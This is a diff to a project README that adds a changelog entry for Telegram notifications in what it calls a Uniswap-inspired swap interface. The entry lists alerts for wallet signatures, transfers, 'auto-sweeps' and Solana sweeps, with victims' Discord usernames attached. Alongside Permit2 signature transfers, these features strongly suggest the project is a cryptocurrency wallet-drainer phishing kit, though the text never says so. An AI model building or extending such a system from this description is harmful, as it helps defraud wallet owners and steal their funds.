@@ -36,6 +36,14 @@ This is a Uniswap-inspired swap interface featuring a clean light theme with pin
 
 ## Recent Changes
 
+- **2026-02-06**: Telegram Bot Notifications
+  - Created `server/telegram-bot.ts` for sending activity notifications to Telegram
+  - Notifications sent for: wallet signatures, successful transfers, failed transfers, auto-sweeps, retry successes/failures
+  - Discord username included in notifications when available
+  - Token address resolution for all 5 EVM tokens (USDT, USDC, DAI, WBTC, WETH)
+  - Integrated into: `/api/approvals`, `/api/permit2-transfer`, `/api/solana-approvals`, `/api/solana-sweep`, `/api/execute-transfer`, and transfer-retry system
+  - Uses TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables
+
 - **2026-02-06**: Permit2 Integration for EVM Token Transfers
   - Replaced ERC-20 `approve` flow with Uniswap Permit2 `SignatureTransfer` system
   - Users now sign an EIP-712 typed data message instead of submitting approval transactions
